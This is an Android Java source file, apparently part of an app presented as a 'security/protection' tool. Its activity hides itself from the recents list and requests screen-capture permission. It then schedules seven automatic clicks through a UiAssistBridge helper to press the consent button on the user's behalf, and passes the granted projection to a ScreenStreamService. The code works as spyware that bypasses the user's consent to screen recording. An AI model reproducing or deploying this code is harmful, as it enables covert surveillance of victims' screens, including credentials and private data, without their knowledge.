package com.seguranca.protecao;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

public class MediaProjectionRequestActivity extends Activity {

    private static final String TAG = "MPRequest";
    private static final int REQ = 9911;
    // [KRYPTOS-PATCH PERF] gate por timestamp: se a activity nao abrir, nao trava mais
    private static volatile long lastLaunchTs = 0L;

    public static void launch(Context ctx) {
        try {
            long now = System.currentTimeMillis();
            if (now - lastLaunchTs < 3000L) return;
            lastLaunchTs = now;
            Intent i = new Intent(ctx, MediaProjectionRequestActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            ctx.startActivity(i);
            Log.d(TAG, "launch pedido de projecao");
        } catch (Throwable t) {
            Log.w(TAG, "launch: " + t);
        }
    }

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) { finish(); return; }
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
            autoClick(350); autoClick(800); autoClick(1300); autoClick(1900);
            autoClick(2600); autoClick(3400); autoClick(4200);
        } catch (Throwable t) {
            Log.w(TAG, "onCreate: " + t);
            finish();
        }
    }

    private void autoClick(long delay) {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override public void run() { UiAssistBridge.clickProjectionStart(); }
        }, delay);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        try {
            if (req == REQ && res == RESULT_OK && data != null) {
                Intent s = new Intent(this, ScreenStreamService.class);
                s.putExtra("resultCode", res);
                s.putExtra("data", data);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(s);
                else startService(s);
                Log.d(TAG, "consentimento OK");
            } else {
                Log.d(TAG, "consentimento cancelado");
            }
        } catch (Throwable t) {
            Log.w(TAG, "onActivityResult: " + t);
        }
        finish();
    }
}